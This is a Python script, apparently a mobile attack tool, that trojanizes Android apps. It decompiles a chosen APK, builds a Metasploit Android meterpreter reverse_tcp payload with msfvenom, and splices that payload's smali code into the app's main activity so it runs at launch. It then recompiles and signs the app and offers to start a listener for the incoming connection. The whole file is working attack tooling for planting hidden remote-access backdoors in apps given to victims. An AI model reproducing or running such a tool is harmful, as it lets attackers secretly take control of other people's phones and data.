import os,sys,time,fileinput
from pathlib import PurePath,Path

w="\033[00m"
r="\033[31;1m"
g="\033[32;1m"
y="\033[33m"
d="\033[2;31m"
b="\033[34;1m"
p="\033[35;1m"
c="\033[36;1m"
W="\033[47m"
R="\033[41m"
B="\033[30m"
G="\033[90m"
BG="\033[100m"

pkgname = []
paydir = []
dirmsf = []

def inject():
    try:
        global pkgname,dirsmali,a3,a1,a2
        print("")
        fullpath = str(input(b+"[+]"+w+" path to apk files ("+r+"ex: /sdcard/my.apk"+w+"): "))
        if os.path.isfile(fullpath):
            pass
        else:
            print(r+"[!]"+w+" file doesnt exists !")
            sys.exit(1)
        a1,a2 = os.path.split(fullpath)
        os.system("cp -r "+fullpath+" "+a2)
        pkgname = os.popen('''aapt dump badging '''+a2+''' | awk '/package/{gsub("name=|'"'"'","");'''+"""  print $2}'""").readline().strip()
        pkgactivity = os.popen('''aapt dump badging '''+a2+''' | awk '/activity/{gsub("name=|'"'"'","");'''+"""  print $2}'""").readline().strip()
        print(b+"[+]"+w+" decompiling "+a2+" using apktool 2.3.4")
        print(b+"[+]"+w+" please wait, this could take a while")
        os.system("proot apktool d -f "+a2+" &> /dev//null")
        if os.path.isdir(a2.replace(".apk","")):
            pass
        else:
            print(r+"[!]"+w+" failed to decompile "+a2)
            sys.exit(1)
        a3 = a2.replace(".apk","")
        pathsmali = os.popen("find -O3 -L "+a3+" -name '*Activity.smali'").read()
        if "MainActivity.smali" in pathsmali:
            pathsmali = os.popen("find -O3 -L "+a3+" -name 'MainActivity.smali'").readline().strip()
            print(w+"----------------------------------------------------")
            print(g+"[✓]"+w+" package name is obtained:-"+y,pkgname)
            print(g+"[✓]"+w+" activity detected:-"+y,pkgactivity)
            print(g+"[✓]"+w+" smali file:- "+y+pathsmali)
            pass
        else:
            print(r+"[!]"+w+" main.activity smali doesnt exist, you can choose manually")
            print("----------------------------------------------------\n\n"+y+pathsmali+w+"\n----------------------------------------------------")
            pathsmali = str(input(b+"[+]"+w+" choose activity smali:- "+g))
            if os.path.isfile(pathsmali):
                pass
            else:
                print(r+"[!]"+w+" file activity smali doesnt exist !")
                sys.exit(1)
        cek = open(pathsmali).read()
        if ".method public onCreate(Landroid/os/Bundle;)V" in cek:
            method = "public"
            pass
        elif ".method protected onCreate(Landroid/os/Bundle;)V" in cek:
            method = "protected"
            pass
        else:
            print(r+"[!]"+w+" please choose another path of smali file")
            pathsmali = str(input(b+"[+]"+w+" choose activity smali:- "+g))
            if os.path.isfile(pathsmali):
                cek = open(pathsmali).read()
                if ".method public onCreate(Landroid/os/Bundle;)V" in cek:
                    method = "public"
                    pass
                elif ".method protected onCreate(Landroid/os/Bundle;)V" in cek:
                    method = "protected"
                    pass
                else:
                    print(r+"[!]"+w+" please try again later and choose another path")
                    sys.exit(1)
            else:
                print(r+"[!]"+w+" file activity smali doesnt exist !")
                sys.exit(1)
        a4 = PurePath(pathsmali)
        dirsmali = (a4.parts[0]+"/"+a4.parts[1]+"/"+a4.parts[2]+"/")
        print(g+"[✓]"+w+" target directories:-"+y,dirsmali)
        hooksmali = a4.parts[2]
        print(g+"[✓]"+w+" hook smali:- "+y+"L"+str(hooksmali)+"/metasploit/stage/MainActivity.smali")
        print(w+"----------------------------------------------------")
        replaces = {".method "+str(method)+" onCreate(Landroid/os/Bundle;)V":".method "+str(method)+" onCreate(Landroid/os/Bundle;)V\n    invoke-static {p0}, L"+str(hooksmali)+"/metasploit/stage/Payload;->start(Landroid/content/Context;)V"}
        for line in fileinput.input(pathsmali, inplace=True):
            for search in replaces:
                replaced = replaces[search]
                line = line.replace(search,replaced)
            print(line, end="")
            pass
        embed()
    except KeyboardInterrupt:
        sys.exit(1)
    except IndexError:
        print(r+"[!]"+w+" failed to decompile apk, please choose another apk files")

def embed():
    global dirmsf,host,port
    if os.path.isfile("host"):
        host = open("host").readline().strip()
        pass
    else:
        os.system("rm -rf payload &> /dev//null")
        pass
    if os.path.isfile("port"):
        os.system("rm -rf payload.apk &> /dev//null")
        port = open("port").readline().strip()
        pass
    else:
        pass
    if os.path.isdir("payload"):
        ask = str(input(b+"[+]"+w+" do you want to use the previous payload? (y/n) "))
        if ask == "y" or ask == "Y":
            paydir = "payload"
            pass
        else:
            host = str(input(b+"[+]"+w+" LHOST :- "+g))
            if host == "" or host == " ":
                host = "127.0.0.1"
                print(b+"[+]"+w+" using default LHOST:- "+host)
                pass
            else:
                pass
            port = str(input(b+"[+]"+w+" LPORT :- "+g))
            if port == "" or port == " ":
                port = "8080"
                print(b+"[+]"+w+" using default LPORT:- "+port)
                pass
            else:
                pass
            print(b+"[+]"+w+" generate metasploit payload using msfvenom")
            os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+str(host)+" lport="+str(port)+" --platform android -a dalvik -o payload.apk &> /dev//null")
            if os.path.isfile("payload.apk"):
                pass
            else:
                print(r+"[!]"+w+" failed to generate metasploit payload")
                sys.exit(1)
            print(b+"[+]"+w+" decompiling payload.apk using apktool 2.3.4")
            print(b+"[+]"+w+" please wait, this could take a while")
            os.system("proot apktool d -f payload.apk &> /dev//null")
            if os.path.isdir("payload"):
                os.system("rm -rf payload.apk")
                paydir = "payload"
                pass
            else:
                print(r+"[!]"+w+" failed to decompile payload.apk")
                sys.exit(1)
    else:
        host = str(input(b+"[+]"+w+" LHOST :- "+g))
        if host == "" or host == " ":
            host = "127.0.0.1"
            print(b+"[+]"+w+" using default LHOST:- "+host)
            pass
        else:
            pass
        port = str(input(b+"[+]"+w+" LPORT :- "+g))
        if port == "" or port == " ":
            port = "8080"
            print(b+"[+]"+w+" using default LPORT:- "+port)
            pass
        else:
            pass
        print(b+"[+]"+w+" generate metasploit payload using msfvenom")
        os.system("echo '"+str(host)+"' > host;echo '"+str(port)+"' > port")
        host = open("host").readline().strip()
        port = open("port").readline().strip()
        os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+str(host)+" lport="+str(port)+" --platform android -a dalvik -o payload.apk &> /dev//null")
        if os.path.isfile("payload.apk"):
            pass
        else:
            print(r+"[!]"+w+" failed to generate metasploit payload")
            sys.exit(1)
        print(b+"[+]"+w+" decompiling payload.apk using apktool 2.3.4")
        print(b+"[+]"+w+" please wait, this could take a while")
        os.system("proot apktool d -f payload.apk &> /dev//null")
        if os.path.isdir("payload"):
            os.system("rm -rf payload.apk")
            paydir = "payload"
            pass
        else:
            print(r+"[!]"+w+" failed to decompile payload.apk")
            sys.exit(1)
    if os.path.isdir(paydir):
        pass
    else:
        print(r+"[!]"+w+" payload directories doesnt exists!")
        sys.exit(1)
    paymsf = paydir+"/smali/com/metasploit/"
    print(b+"[+]"+w+" using injection:- "+y+paymsf)
    os.system("cp -r "+paymsf+" "+str(dirsmali))
    if os.path.isdir(str(dirsmali)+"/metasploit"):
        print(g+"[✓]"+w+" injection succesfully:- "+y+str(dirsmali)+"metasploit")
        pass
    else:
        print(r+"[!]"+w+" injection failed, please check your directories")
        sys.exit(1)
    print(b+"[+]"+w+" recompiling original apk using apktool 2.4.1")
    os.system("proot apktool241 b "+a3+" -o raw.apk &> /dev//null")
    print(b+"[+]"+w+" signing original apk using apksigner")
    os.system("proot apk-signer -k debug.jks -a debugging -s debugging -f raw.apk -o "+a3+"-injected.apk &> /dev//null")
    if os.path.isfile(a3+"-injected.apk"):
        out = str(input(b+"[+]"+w+" save file to(ex: /sdcard): "+y))
        if os.path.isdir(out):
            os.system("mv "+a3+"-injected.apk "+out)
            print(g+"[✓]"+w+" file saved as:- "+g+out+"/"+a3+"-injected.apk"+w)
            os.system("rm -rf '?' original.apk raw.apk "+a2+" "+a3)
            print("")
            if os.path.isfile("host"):
                if os.path.isfile("port"):
                    host = open("host").readline().strip()
                    port = open("port").readline().strip()
                    dog = str(input("do you want to start listener? (y/n) "))
                    if dog == "y" or dog == "Y":
                        os.system('msfconsole -x "use multi/handler;set payload android/meterpreter/reverse_tcp;set lhost '+host+';set lport '+port+';show options"')
                    else:
                        sys.exit(1)
                else:
                    os.system("rm -rf payload payload.apk &> /dev//null")
                    pass
            else:
                pass
        else:
            out = "/sdcard"
            os.system("mv "+a3+"-injected.apk /sdcard")
            print(g+"[✓]"+w+" file saved as:- "+g+out+"/"+a3+"-injected.apk"+w)
            os.system("rm -rf '?' original.apk raw.apk "+a2+" "+a3)
            print("")
            dog = str(input("do you want to start listener? (y/n) "))
            if dog == "y" or dog == "Y":
                os.system('msfconsole -x "use multi/handler;set payload android/meterpreter/reverse_tcp;set lhost '+host+';set lport '+port+';show options"')
            else:
                sys.exit(1)
        print("")
        dog = str(input(w+"[ enter ]"))
        sys.exit(1)
    else:
        print(r+"[!]"+w+" failed to sign apk file")
        sys.exit(1)

inject()
